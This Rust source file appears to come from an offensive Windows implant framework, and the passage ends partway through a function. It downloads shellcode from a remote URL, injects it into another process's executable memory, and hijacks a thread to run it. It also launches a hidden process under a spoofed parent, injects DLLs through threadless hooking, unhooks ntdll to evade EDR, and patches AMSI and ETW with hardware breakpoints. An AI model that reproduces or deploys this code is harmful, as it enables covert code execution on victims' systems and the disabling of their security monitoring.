#![allow(non_snake_case, unused_imports)]

//use anyhow::Ok;
use std::result::Result::Ok;
use memoffset::offset_of;
use winapi::shared::windef::SIZE;
use std::env::consts;
use std::ffi::{OsStr, c_char, CStr, c_int};
use std::io;
use std::os::windows::ffi::OsStrExt;
use std::{mem::size_of, ptr::null_mut};
use widestring::U16CString;
use winapi::ctypes::c_void;
use std::ptr::NonNull;
use rand::prelude::SliceRandom;
use std::mem;
use std::arch::asm;

use winapi::{
    vc::excpt::{EXCEPTION_CONTINUE_EXECUTION,EXCEPTION_CONTINUE_SEARCH},
    shared::{
        ntdef::{HANDLE, PVOID, OBJECT_ATTRIBUTES, NT_SUCCESS, NTSTATUS, UNICODE_STRING, LIST_ENTRY, SHORT, WCHAR,LONG},
        basetsd::SIZE_T,
        minwindef::{ULONG,DWORD},
        ntstatus::STATUS_SUCCESS,
    },

    um::{
        winnt::{
                THREAD_ALL_ACCESS, CONTEXT, CONTEXT_ALL, IMAGE_NT_HEADERS, IMAGE_SECTION_HEADER, IMAGE_DOS_HEADER,
                IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_EXPORT_DIRECTORY,IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_NT_SIGNATURE, 
                IMAGE_DOS_SIGNATURE, LARGE_INTEGER, MEM_RELEASE, MEMORY_BASIC_INFORMATION, EXCEPTION_POINTERS,
                THREAD_GET_CONTEXT, THREAD_SET_CONTEXT, PROCESS_ALL_ACCESS,
            },
        errhandlingapi::AddVectoredExceptionHandler,
        minwinbase::EXCEPTION_SINGLE_STEP,
    },
};

use ntapi::{
    ntldr::LDR_DATA_TABLE_ENTRY,
    ntpsapi::{PEB_LDR_DATA, PROCESS_BASIC_INFORMATION, ProcessBasicInformation, PS_ATTRIBUTE, PS_CREATE_INFO, ProcessImageFileName},
    ntpebteb::PEB,
    ntexapi::{SYSTEM_PROCESS_INFORMATION, SystemProcessInformation, SYSTEM_THREAD_INFORMATION, SYSTEM_INFORMATION_CLASS},
    ntrtl::{RtlCreateProcessParametersEx ,RtlDestroyProcessParameters, RTL_USER_PROCESS_PARAMETERS},
    ntobapi::DUPLICATE_SAME_ACCESS,
};
use dinvoke_rs::dinvoke;
use dinvoke_rs::data::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ, PAGE_EXECUTE_WRITECOPY, };
use unwinder;
use shelter;

use crate::namoracore::ntapi::*;
use crate::stager;

use obfstr::obfstr as m;
use std::sync::{Mutex, Once};

use lazy_static::lazy_static;

//const DELAY_MULTIPLIER: i64 = 10_000;
//const STACK_OFFSET: isize = 8192;
pub const KEY: u8 = 0x42;
const STARTF_USESHOWWINDOW: DWORD = 0x00000001;
const SW_HIDE: c_int = 0;
const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON: u64 = 0x10000000000;
const S_OK: i32 = 0;
const AMSI_RESULT_CLEAN: i32 = 0;

use std::sync::atomic::AtomicPtr;

lazy_static! {
    static ref AMSI_SCAN_BUFFER_PTR: Mutex<Option<AtomicPtr<u8>>> = Mutex::new(None);
    static ref NT_TRACE_CONTROL_PTR: Mutex<Option<AtomicPtr<u8>>> = Mutex::new(None);
}

/*#[repr(C)]
pub struct CLIENT_ID {
    pub UniqueProcess: HANDLE,
    pub UniqueThread: HANDLE,

} */

#[repr(C)]
pub struct PS_ATTRIBUTE_LIST {
    TotalLength: SIZE_T,
    Attributes: [PS_ATTRIBUTE; 3],

}

#[repr(C)]
pub struct DllDataTable {
    pub InLoadOrderLinks: LIST_ENTRY,
    pub InMemoryOrderLinks: LIST_ENTRY,
    pub InInitializationOrderLinks: LIST_ENTRY,
    pub DllBase: PVOID,
    pub EntryPoint: PVOID,
    pub SizeOfImage: ULONG,
    pub FullDllName: UNICODE_STRING,
    pub BaseDllName: UNICODE_STRING,
    pub Flags: ULONG,
    pub LoadCount: SHORT,
    pub TlsIndex: SHORT,
    pub HashTableEntry: LIST_ENTRY,
    pub TimeDateStamp: ULONG,

}

pub struct Process {
    pub process_name: String,
    pub process_id: u32,
    pub file_path: String,
    pub file_name: String,
    pub process_handle: isize,
    pub allocated_memory: usize,
    pub thread_handle: HANDLE, // new field

}

pub fn inject_shellcode(process: &mut Process, url: &str) {
    let module_base = get_module_base_by_name(&process.file_name, process.process_id)
        .expect(m!("Error getting module base"));

    let rx_section_offset = find_rx_section_offset(process, module_base as usize)
        .expect(m!("Error finding RX section offset"));

    let rx_section_size = find_rx_section_size(process, module_base as usize)
        .expect(m!("Error in finding RX section size"));

    
    //We should get encoded shellcode from url
    // We should get encoded shellcode from url
    let data = match url.starts_with("http://") || url.starts_with("https://") {
        true => stager::fetch_payload(&url),
        false => Err("URL must start with http:// or https://".to_string()),
    }; // Propagate the error if any

    //put the data in srdi
    let srdi = match data {
        Ok(dat) => dat,
        Err(e) => panic!("Could not get srdi: {}", e),
    };

    if srdi.len() > rx_section_size as usize{
        panic!("Shellcode is too large for the RX section");
    }

    let injection_address = unsafe { module_base.offset(rx_section_offset as isize) };

    let formatted_string = format!("{} {:p}", m!("Injection address:"), injection_address);
    println!("{}", formatted_string);

    let old_permissions:i32 = 0;
    let mut region_size: SIZE_T = rx_section_size.try_into().unwrap();

    let protect_status = nt_protect_virtual_memory(
        process.process_handle as HANDLE,
        injection_address as *mut PVOID,
        &mut region_size as *mut SIZE_T,
        PAGE_READWRITE,
        old_permissions as *mut u32,
    );

    if protect_status != 0 {
        panic!("{}", m!("Failed to change memory protection"));
    }

    let bytes_written: i32 = 0;
    let buffer = srdi.as_ptr() as *mut c_void;

    let write_status = nt_write_virtual_memory(
        process.process_handle as HANDLE,
        injection_address as PVOID,
        buffer as PVOID,
        srdi.len(),
        bytes_written as *mut usize,
    );

    if write_status != 0 || bytes_written as usize != srdi.len() {
        panic!("{}", m!("Failed to write memory"));
    }

    let formatted_string = format!("{} {}", m!("Shellcode written to:"), bytes_written);
    println!("{}", formatted_string);

    let protect_status = nt_protect_virtual_memory(
        process.process_handle as HANDLE,
        injection_address as *mut PVOID,
        &mut region_size as *mut SIZE_T,
        PAGE_EXECUTE_READ,
        old_permissions as *mut u32,
    );

    if protect_status != 0 {
        panic!("{}", m!("Failed to change memory protection"));
    }

    let handle = process.process_handle as HANDLE;

    //get remote thread handle
    let hthread = match get_remote_thread_handle(process.process_id) {
        Ok(handle) => handle,
        Err(e) => {
            panic!("{} {}", m!("Failed to get remote thread handle"), e);
        }
    };

    //hijack the thread
    let formatted_string = format!("{} {:p}", m!("Hijacking thread:"), hthread);
    println!("{}", formatted_string);

    match jmp_hijack_thread(hthread, injection_address as PVOID, handle) {
        Ok(_) => {
            println!("{}", m!("Thread hijacked successfully"));
        }
        Err(e) => {
            panic!("{} {}", m!("Failed to hijack thread"), e);
        }
    };


    let _ = unlink_module(&process.file_name, process.process_id);

    //close the thread handle
    //nt_close(hthread);

    nt_close_unwinder(handle);

    //Ok(())
}

fn mac_to_bytes(shellcode: &[&str]) -> Vec<u8> {
    let mut bytes = Vec::new();

    for code in shellcode {
        let split_codes = code.split('-');
        for split_code in split_codes {
            let byte = u8::from_str_radix(split_code, 16).unwrap();
            bytes.push(byte ^ KEY);  // XOR each byte with the key
        }
    }

    bytes

}

//spawn a new process with spoofed PPID
pub fn spawn_spoofed_ppid_process(ppid: u64, process: &mut Process) {
    unsafe {

        //C:\Program Files\Windows Security\BrowserCore\BrowserCore.exe
        let nt_image_path = U16CString::from_str("\\??\\C:\\Program Files\\Windows Security\\BrowserCore\\BrowserCore.exe").unwrap();
        let current_directory = U16CString::from_str("\\??\\C:\\Program Files\\Windows Security\\BrowserCore\\").unwrap();
        let command_line = U16CString::from_str(" ").unwrap();

        //locate RtlUnicodeString
        let ntdll = dinvoke_rs::dinvoke::get_module_base_address("ntdll.dll");
        let function_address = dinvoke_rs::dinvoke::get_function_address(ntdll, "RtlUnicodeStringToAnsiString");

        let RtlInitUnicodeString = std::mem::transmute::<
            _,
            extern "system" fn(*mut UNICODE_STRING, *const u16),
        >(function_address);


        //locate RtlCreateProcessParametersEx
        let function_address = dinvoke_rs::dinvoke::get_function_address(ntdll, "RtlCreateProcessParametersEx");
        let RtlCreateProcessParametersEx = std::mem::transmute::<
            _,
            extern "system" fn(
                *mut *mut RTL_USER_PROCESS_PARAMETERS, // pProcessParameters
                *mut UNICODE_STRING,                   // ImagePathName
                *mut UNICODE_STRING,                   // DllPath
                *mut UNICODE_STRING,                   // CurrentDirectory
                *mut UNICODE_STRING,                   // CommandLine
                *mut c_void,                           // Environment
                *mut UNICODE_STRING,                   // WindowTitle
                *mut UNICODE_STRING,                   // DesktopInfo
                *mut UNICODE_STRING,                   // ShellInfo
                *mut UNICODE_STRING,                   // RuntimeData
                u32,                                   // Flags
            ) -> i32,
        >(function_address);

        //unicode strings
        let mut nt_image_path: Vec<u16> = nt_image_path.as_slice().to_vec();
        nt_image_path.push(0);
        let mut nt_image_path_unicode: UNICODE_STRING = std::mem::zeroed();
        RtlInitUnicodeString(&mut nt_image_path_unicode, nt_image_path.as_ptr());

        let mut current_directory: Vec<u16> = current_directory.as_slice().to_vec();
        current_directory.push(0);
        let mut current_directory_unicode: UNICODE_STRING = std::mem::zeroed();
        RtlInitUnicodeString(&mut current_directory_unicode, current_directory.as_ptr());

        let mut command_line: Vec<u16> = command_line.as_slice().to_vec();
        command_line.push(0);
        let mut command_line_unicode: UNICODE_STRING = std::mem::zeroed();
        RtlInitUnicodeString(&mut command_line_unicode, command_line.as_ptr());

        let mut process_parameters: *mut _ = null_mut();
        let status = RtlCreateProcessParametersEx(
            &mut process_parameters,
            &mut nt_image_path_unicode,
            null_mut(),
            &mut current_directory_unicode,
            &mut command_line_unicode,
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            0x01,
        );

        //to start in hidden mode
        (*process_parameters).WindowFlags = STARTF_USESHOWWINDOW;
        (*process_parameters).ShowWindowFlags = SW_HIDE as u32;

        if !NT_SUCCESS(status) {
           println!("Failed to create process parameters: {:#X}", status);
        }

        // Obtain handle to parent (e.g., explorer.exe with PID 10104)
        let mut oa: OBJECT_ATTRIBUTES = std::mem::zeroed();
        let mut cid = CLIENT_ID {
            UniqueProcess: ppid as HANDLE,
            UniqueThread: null_mut(),
        };
        
        let mut hParent: HANDLE = null_mut();
        let status = nt_open_process(&mut hParent, PROCESS_ALL_ACCESS, &mut oa, &mut cid);
        if !NT_SUCCESS(status) {
            println!("Failed to open handle to parent process: {:#X}", status);
        }

        // Adjust the PS_ATTRIBUTE_LIST to hold 3 attributes
        let mut attribute_list: PS_ATTRIBUTE_LIST = std::mem::zeroed();
        attribute_list.TotalLength = size_of::<PS_ATTRIBUTE_LIST>() as _;
 
 
        // Initialize the PS_CREATE_INFO structure
        let mut create_info: PS_CREATE_INFO = std::mem::zeroed();
        create_info.Size = size_of::<PS_CREATE_INFO>() as _;
 
        attribute_list.Attributes[0].Attribute = 0x20005; // PS_ATTRIBUTE_IMAGE_NAME 
        attribute_list.Attributes[0].Size = nt_image_path_unicode.Length as usize;
        attribute_list.Attributes[0].u.Value = nt_image_path_unicode.Buffer as usize;

        // Set Parent Process attribute
        attribute_list.Attributes[1].Attribute = 0x00060000;
        attribute_list.Attributes[1].Size = size_of::<HANDLE>();
        attribute_list.Attributes[1].u.ValuePtr = hParent;

        // BlockDLLs policy
        let policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
        attribute_list.Attributes[2].Attribute = 0x20010 as usize;
        attribute_list.Attributes[2].Size = size_of::<u64>();
        attribute_list.Attributes[2].u.ValuePtr = &policy as *const _ as *mut c_void;

            
        let mut h: HANDLE = null_mut();
        let mut t: HANDLE = null_mut();

        let r2 = nt_create_user_process(
            &mut h,
            &mut t,
            PROCESS_ALL_ACCESS,
            THREAD_ALL_ACCESS,
            null_mut(),
            null_mut(),
            0,
            1, // suspended
            process_parameters as *mut c_void,
            &mut create_info,
            &mut attribute_list as *mut PS_ATTRIBUTE_LIST,
        );

        let mut pbi: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
        let pbi_status = nt_query_information_process(
            h,
            ProcessBasicInformation,
            &mut pbi as *mut _ as PVOID,
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as ULONG,
            null_mut(),
        );

        if pbi_status == 0 || r2 ==0 {
            process.process_id = pbi.UniqueProcessId as u32;
            process.process_handle = h as isize;
            process.thread_handle = t as *mut c_void;
            let mut return_length: ULONG = 0;
            let mut buffer: [WCHAR; 1024] = [0; 1024];

            let status = nt_query_information_process(
                h,
                ProcessImageFileName,
                buffer.as_mut_ptr() as PVOID,
                1024 * std::mem::size_of::<WCHAR>() as ULONG,
                &mut return_length,
            );
            if status == 0 {
                let len = return_length as usize / std::mem::size_of::<WCHAR>();
                let path = String::from_utf16(&buffer[..len]).expect("Failed to convert WCHAR buffer to String");
                
                if let Some(filename) = path.split('\\').last() {
                    process.process_name = filename.to_owned();
                }
            } else {
                println!("NTSTATUS: {:x}", r2);
                println!("Error querying process info: {:?}", status);
            }
        }

        //close the parent handle
        nt_close(hParent);

        //free any allocated memory
        RtlDestroyProcessParameters(process_parameters);


    }
}

pub fn inject_dll(process: &mut Process) {
    process.process_handle = get_process_handle(process.process_id)
        .expect("Failed to get process handle");

    let dll_path_wide: Vec<u16> = OsStr::new(&process.file_path)
        .encode_wide()
        .chain(Some(0).into_iter())
        .collect();

    let mut base_address: PVOID = null_mut();

    let mut region_size: SIZE_T = (dll_path_wide.len() * 2) as SIZE_T;

    let status = nt_allocate_virtual_memory(
        process.process_handle as HANDLE,
        &mut base_address,
        0,
        &mut region_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if status != 0 {
        panic!("{}", m!("Failed to allocate memory"));
    }
    process.allocated_memory = base_address as usize;

    let formatted_string = format!("{} {:#x}", m!("Allocated memory at:"), process.allocated_memory);
    println!("{}", formatted_string);

    //write dll path to process memory
    let status = nt_write_virtual_memory(
        process.process_handle as HANDLE,
        process.allocated_memory as PVOID,
        dll_path_wide.as_ptr() as PVOID,
        region_size,
        null_mut::<usize>(),
    );
    if status != 0 {
        panic!("{}", m!("Failed to write memory"));
    }

    //get address of LoadLibraryW
    let kernel32_base = get_module_base_by_name("kernel32.dll", process.process_id)
        .expect(m!("Failed to get kernel32 base address"));
    let formatted_string = format!("{} {:p}", m!("Kernel32 base address:"), kernel32_base);
    println!("{}", formatted_string);

    let load_library_address = get_proc_address(kernel32_base, "LoadLibraryW")
        .expect(m!("Failed to get LoadLibraryW address"));
    let formatted_string = format!("{} {:p}", m!("LoadLibraryW address:"), load_library_address);
    println!("{}", formatted_string);

    //ensure shellcode is correctly constructed and the placeholders are replaced with the correct addresses
    let mut load_library_shellcode: Vec<u8> = vec![
        0x55, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x30,
        0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xFF, 0xD0, 0xC9, 0xC3
    ];
    
    load_library_shellcode[10..18].copy_from_slice(&(process.allocated_memory as u64).to_le_bytes());
    load_library_shellcode[20..28].copy_from_slice(unsafe {
        std::slice::from_raw_parts(&load_library_address as *const _ as *const u8, 8)
    });

    //allocate memory for shellcode in the remote process
    let mut shellcode_address: PVOID = null_mut();
    let mut shellcode_size: SIZE_T = load_library_shellcode.len();
    let status = nt_allocate_virtual_memory(
        process.process_handle as HANDLE,
        &mut shellcode_address,
        0,
        &mut shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );
    if status != 0 {
        panic!("{}", m!("Failed to allocate memory"));
    }

    //write shellcode to remote process
    let status = nt_write_virtual_memory(
        process.process_handle as HANDLE,
        shellcode_address,
        load_library_shellcode.as_ptr() as PVOID,
        load_library_shellcode.len(),
        null_mut::<usize>(),
    );
    if status != 0 {
        panic!("{}", m!("Failed to write memory"));
    }

    //protect shellcode memory as PAGE_EXECUTE_READ
    let mut old_protect: u32 = 0;
    let protect_status = nt_protect_virtual_memory(
        process.process_handle as HANDLE,
        &mut shellcode_address,
        &mut shellcode_size,
        PAGE_EXECUTE_READ,
        &mut old_protect,
    );
    if protect_status != 0 {
        panic!("{}", m!("Failed to change protection"));
    }

    let dll_base = get_module_base_by_name("ntdll.dll", process.process_id)
        .expect(m!("Failed to get ntdll.dll base"));

    let load_address = get_proc_address(dll_base, "NtCreateUserProcess")
        .expect(m!("Failed to get NtCreateUserProcess address"));

    println!("{} {:#x}", m!("Crafted assembly at address:"), shellcode_address as usize);

    let formatted_string = format!("{} {:p}", m!("NtCreateUserProcess address:"), load_address);
    println!("{}", formatted_string);

    //run the threadless thread
    let result = threadless_thread(
        process.process_handle as *mut c_void,
        shellcode_address as *mut c_void,
        load_address as *mut c_void,
    );

    if !result {
        panic!("{}", m!("Failed to run threadless thread"));
    }

    //clean up
    let status = nt_free_virtual_memory(
        process.process_handle as HANDLE,
        &mut shellcode_address,
        &mut shellcode_size,
        MEM_RELEASE,
    );

    if status != 0 {
        panic!("{}", m!("Failed to free memory"));
    }


}

pub fn unhook_ntdll(remote_process: &mut Process, write_to_remote: bool) {
    let current_process_id = get_current_process_id().unwrap_or_else(|err| panic!("{}", err));
    let current_process_handle = if write_to_remote {
        get_process_handle(current_process_id).unwrap_or_else(|err| {
            println!("Error getting process handle: {}", err);
            panic!("{}", err);
        })as *mut c_void
    } else {
        get_current_process_handle().unwrap_or_else(|err| {
            println!("Error getting process handle: {}", err);
            panic!("{}", err);
        })
    };

    if write_to_remote {
        println!("[+] Unhooking the NTDLL for Process with PID {}.",remote_process.process_id);
    }else {
        println!("[+] Unhooking the NTDLL for Process with PID {}.",current_process_id);
    };

    // Get the base address of ntdll.dll using the current process's information
    let ntdll_base = get_module_base_by_name("ntdll.dll", current_process_id).unwrap_or_else(|err| panic!("{}", err));
    
    // Find the .text section of ntdll in the remote process
    let text_section_offset = find_rx_section_offset(remote_process, ntdll_base as usize).expect("Failed to find rx section offset");
    let text_section_size = find_rx_section_size(remote_process, ntdll_base as usize).expect("Failed to get rx section size");
    
    // Read the pristine .text section from the remote process
    let mut buffer: Vec<u8> = vec![0; text_section_size as usize];
    let mut bytes_read: SIZE_T = 0;
    let status = nt_read_virtual_memory(
        remote_process.process_handle as HANDLE,
        (ntdll_base as usize + text_section_offset as usize) as PVOID,
        buffer.as_mut_ptr() as PVOID,
        text_section_size as usize,
        &mut bytes_read,
    );
    
    if status != 0 || bytes_read != text_section_size as SIZE_T {
        println!("Failed to read memory from remote process. Status: {}, Bytes Read: {}", status, bytes_read);
        panic!("Failed to read the .text section of ntdll.dll from the remote process");
    }

    if write_to_remote {
        let suspend_count: u32 = 0;
        nt_resume_thread(remote_process.thread_handle, suspend_count as *mut u32);
        //sleep obf using shelter
        let time_to_sleep = Some(5000);
        let _ = shelter::fluctuate(false, time_to_sleep, None);
    }

    // Overwrite the .text section of ntdll in the destination process (either current or remote) with the pristine copy
    let base_address = (ntdll_base as usize + text_section_offset as usize) as *mut c_void;
    let mut size_to_protect = text_section_size as SIZE_T;
    let mut old_protect: DWORD = 0;
    
    // Change protection of the target area to PAGE_EXECUTE_READWRITE
    let protect_status = nt_protect_virtual_memory(
        current_process_handle as HANDLE,
        base_address as *mut PVOID,
        &mut size_to_protect as *mut SIZE_T,
        PAGE_EXECUTE_READWRITE,
        &mut old_protect as *mut DWORD,
    );

    if protect_status != 0 {
        println!("Failed to change protection. Status: {}", protect_status);
        panic!("Failed to change protection to PAGE_EXECUTE_READWRITE");
    }

    let mut bytes_written: SIZE_T = 0;
    let write_status = nt_write_virtual_memory(
        current_process_handle as HANDLE,
        base_address as PVOID,
        buffer.as_ptr() as PVOID,
        text_section_size as usize,
        &mut bytes_written,
    );

    if write_status != 0 || bytes_written != text_section_size as SIZE_T {
        println!("Failed to write memory to remote process. Status: {}, Bytes Written: {}", write_status, bytes_written);
        panic!("Failed to write the pristine .text section of ntdll.dll to the remote process");
    }

    //restore old protection
    let restore_protect_status = nt_protect_virtual_memory(
        current_process_handle as HANDLE,
        base_address as *mut PVOID,
        &mut size_to_protect as *mut SIZE_T,
        old_protect,
        &mut old_protect as *mut DWORD,
    );

    if restore_protect_status != 0 {
        println!("Failed to restore protection. Status: {}", restore_protect_status);
        panic!("Failed to restore protection to the original value");
    }

    if write_to_remote {
        println!("[+] Unhooking the NTDLL from PID {} completed successfully.",remote_process.process_id);
    }else {
        println!("[+] Unhooking the NTDLL from PID {} completed successfully.",current_process_id);
    };
}

pub fn setup_bypass() -> Result<*mut c_void, String> {
    let mut thread_ctx: CONTEXT = unsafe { std::mem::zeroed() };
    thread_ctx.ContextFlags = CONTEXT_ALL;

    //handling result with match
    let process_id = get_current_process_id().map_err(|e| format!("Failed to get current process id: {}", e))?;

    unsafe {
        //check if amsi.dll is installed
        let mut amsi_scan_buffer_ptr = AMSI_SCAN_BUFFER_PTR.lock().map_err(|e| format!("Failed to lock AMSI_SCAN_BUFFER_PTR: {}", e))?;

        if amsi_scan_buffer_ptr.is_none() {
            let amsi_module_handle = match get_module_base_by_name("amsi.dll", process_id as u32) {
                Ok(handle) => handle,
                Err(_) => {
                    // Here you can provide a fallback value or alternative logic
                    // For example, setting the handle to a default value or `null`
                    null_mut()
                }
            };

            if amsi_module_handle.is_null() {
                println!("{} {}", m!("amsi.dll not found"), m!("Skipping AMSI setup"));
            } else {
                let amsi_function_ptr = get_proc_address(amsi_module_handle, "AmsiScanBuffer")
                    .expect(m!("Failed to get AmsiScanBuffer function pointer"));
               

                *amsi_scan_buffer_ptr = Some(AtomicPtr::new(amsi_function_ptr as *mut u8));
                    
            }

        }

        //check if nttrace.dll is installed
        let mut nt_trace_control_ptr = NT_TRACE_CONTROL_PTR.lock().map_err(|e| format!("Failed to lock NT_TRACE_CONTROL_PTR: {}", e))?;

        if nt_trace_control_ptr.is_none() {
            let ntdll_module_handle = get_module_base_by_name("ntdll.dll", process_id as u32)
                .map_err(|e| format!("Failed to get ntdll module name: {}", e))?;

            let ntdll_function_ptr = get_proc_address(ntdll_module_handle, "NtTraceControl")
                .map_err(|e| format!("Failed to get NtTraceControl function pointer: {}", e))?;

            *nt_trace_control_ptr = Some(AtomicPtr::new(ntdll_function_ptr as *mut u8));
        }
    }

    let h_ex_handler = add_vectored_exception_handler(1, Some(exception_handler));

    //get handles to all threads in the process
    let thread_handles = get_threads_handle(process_id as u32)
        .map_err(|e| format!("Failed to get thread handles: {}", e))?;

    if thread_handles.is_empty() {
        return Err(m!("No threads found in the process").to_string());
    }

    for thread_handle in thread_handles {
        let status = nt_get_context_thread(thread_handle, &mut thread_ctx);

        if !NT_SUCCESS(status) {
            eprintln!("Failed to get thread context for handle {:?}: {:#X}", thread_handle, status);
            //continue to nexthandle instead of returning an error
            continue;
        }

        //set breakpoints for AmsiScanBuffer and NtTraceControl
        unsafe {
            let amsi_scan_buffer_ptr = AMSI_SCAN_BUFFER_PTR.lock().map_err(|e| format!("Failed to lock AMSI_SCAN_BUFFER_PTR: {}", e))?;
            if let Some(ref amsi_ptr) = *amsi_scan_buffer_ptr {
                enable_breakpoint(&mut thread_ctx, amsi_ptr.load(std::sync::atomic::Ordering::SeqCst), 0);
            }

            let nt_trace_control_ptr = NT_TRACE_CONTROL_PTR.lock().map_err(|e| format!("Failed to lock NT_TRACE_CONTROL_PTR: {}", e))?;
            if let Some(ref nt_trace_ptr) = *nt_trace_control_ptr {
                enable_breakpoint(&mut thread_ctx, nt_trace_ptr.load(std::sync::atomic::Ordering::SeqCst), 1);
            }
        }

        if nt_set_context_thread(thread_handle, &mut thread_ctx) != 0 {
            eprintln!("Failed to set thread context for handle {:?}", thread_handle);
            continue;
        }

        nt_close_unwinder(thread_handle);
    }

    Ok(h_ex_handler)
}

unsafe extern "system" fn exception_handler(exceptions: *mut EXCEPTION_POINTERS) -> i32 {
    unsafe {
        let context = &mut (*(*exceptions).ContextRecord);
        let exception_code = (*(*exceptions).ExceptionRecord).ExceptionCode;
        let exception_address = (*(*exceptions).ExceptionRecord).ExceptionAddress as usize;

        if exception_code == EXCEPTION_SINGLE_STEP {
            if let Some(ref amsi_address) = *AMSI_SCAN_BUFFER_PTR.lock().unwrap() {
                if exception_address == amsi_address.load(std::sync::atomic::Ordering::SeqCst) as usize {
                    println!("AMSI bypass invoked at addrr: {:#X}", exception_address);

                    let return_address = get_return_address(context);
                    let scan_result_ptr = get_arg(context, 5) as *mut u32;
                    *scan_result_ptr = AMSI_RESULT_CLEAN as u32;

                    set_ip(context, return_address);
                    adjust_stack_pointer(context, std::mem::size_of::<*mut u8>() as i32);
                    set_result(context, S_OK as usize);

                    clear_breakpoint(context, 0);
                    return EXCEPTION_CONTINUE_EXECUTION;
                }
            }

            if let Some(ref nt_trace_address) = *NT_TRACE_CONTROL_PTR.lock().unwrap() {
                if exception_address == nt_trace_address.load(std::sync::atomic::Ordering::SeqCst) as usize {
                    println!("NtTraceControl bypass invoked at addrr: {:#X}", exception_address);

                    //use find gadget logic to modify RIP

                    if let Some(new_rip) = find_gadget(exception_address, b"\xc3", 1, 500) {
                        context.Rip = new_rip as u64;
                    }

                    clear_breakpoint(context, 1);
                    return EXCEPTION_CONTINUE_EXECUTION;
                }
            }
        }

        EXCEPTION_CONTINUE_SEARCH
    }

}

/*unsafe extern "system" fn encrypt_thread(duration: PVOID) -> u32 {

    let ms = *(duration as *const u64);
    dbg!("[+] Encrypt_thread sleep duration: {} Sec", ms / 1000);

    let delay_interval = -(DELAY_MULTIPLIER * ms as i64);
    let key = b"It2H@Qp3Xe*sxdc#KA8)dbMtI5Q7&FK";

    let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
    let pseudo_handle = -1isize as *mut c_void;

    let status = nt_query_virtual_memory(
        pseudo_handle,
        duration,
        0,
        &mut mbi as *mut _ as PVOID,
        std::mem::size_of::<MEMORY_BASIC_INFORMATION>() as usize,
        std::ptr::null_mut::<usize>(),
    );
    if status != 0 {
        dbg!("Failed to query memory");
    }

    let stack_region = (mbi.BaseAddress as isize - STACK_OFFSET) as *mut u8;
    let stack_base =(stack_region as isize + mbi.RegionSize as isize + STACK_OFFSET) as *mut u8;
    let stack_size = stack_base as usize - duration as *mut u8 as usize;

    //snapshot the current stack
    let _stack_snapshot: Vec<u8> = unsafe { std::slice::from_raw_parts(stack_region, stack_size) }.to_vec();

    //shuffle the stack
    let order = shuffle_stack(stack_region, stack_size);
    let _stack_after_shuffle: Vec<u8> = unsafe { std::slice::from_raw_parts(stack_region, stack_size) }.to_vec();

    //encrypt the the shuffled stack
    xor_encrypt(stack_region, stack_size, key);
    let _stack_after_encryption: Vec<u8> = unsafe { std::slice::from_raw_parts(stack_region, stack_size) }.to_vec();

    let status = nt_delay_execution(false, &delay_interval as *const i64 as *mut LARGE_INTEGER);
    if status < 0 {
        eprintln!("[-] NtDelayExecution failed with status: {:#X}", status);
    } else {
        println!("[+] Sleep done");
    }

    // 4. Decrypt the shuffled stack
    xor_encrypt(stack_region, stack_size, key);
    let _stack_after_decryption: Vec<u8> = unsafe { std::slice::from_raw_parts(stack_region, stack_size) }.to_vec();


    // 5. Restore the original order of the stack
    restore_stack(stack_region, stack_size, order);
    let _stack_after_restore: Vec<u8> = unsafe { std::slice::from_raw_parts(stack_region, stack_size) }.to_vec();

    0

}*/

fn threadless_thread(process_handle: *mut c_void, executable_code_address: *mut c_void, mut export_address: *mut c_void) -> bool {
    let mut trampoline: Vec<u8> = vec![
        0x58,                                                           // pop RAX
        0x48, 0x83, 0xe8, 0x0c,                                         // sub RAX, 0x0C                    : when the function will return, it will not return to the next instruction but to the previous one
        0x50,                                                           // push RAX
        0x55,                                                           // PUSH RBP
        0x48, 0x89, 0xE5,                                               // MOV RBP, RSP
        0x48, 0x83, 0xec, 0x08,                                         // SUB RSP, 0x08                    : always equal to 8%16 to have an aligned stack. It is mandatory for some function call
        0x51,                                                           // push RCX                         : just save the context registers
        0x52,                                                           // push RDX
        0x41, 0x50,                                                     // push R8
        0x41, 0x51,                                                     // push R9
        0x41, 0x52,                                                     // push R10
        0x41, 0x53,                                                     // push R11
        0x48, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // movabs RCX, 0x0000000000000000   : restore the hooked function code
        0x48, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // movabs RDX, 0x0000000000000000   : restore the hooked function code
        0x48, 0x89, 0x08,                                               // mov qword ptr[rax], rcx          : restore the hooked function code
        0x48, 0x89, 0x50, 0x08,                                         // mov qword ptr[rax+0x8], rdx      : restore the hooked function code
        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // mov RAX, 0x0000000000000000      : Address where the execution flow will be redirected
        0xff, 0xd0,                                                     // call RAX                         : Call the malicious code
        0x41, 0x5b,                                                     // pop R11                          : Restore the context
        0x41, 0x5a,                                                     // pop R10
        0x41, 0x59,                                                     // pop R9
        0x41, 0x58,                                                     // pop R8
        0x5a,                                                           // pop RDX
        0x59,                                                           // pop RCX
        0xc9,                                                           // leave
        0xc3 
    ];

    let mut original_instructions_high: u64 = 0;
    let mut original_instructions_low: u64 = 0;
    let mut sz_output: usize = 0;
    let original_export_address = export_address;

    //read the original instructions
    let read_status_high = nt_read_virtual_memory(
        process_handle,
        export_address as *mut c_void,
        &mut original_instructions_high as *mut _ as *mut c_void,
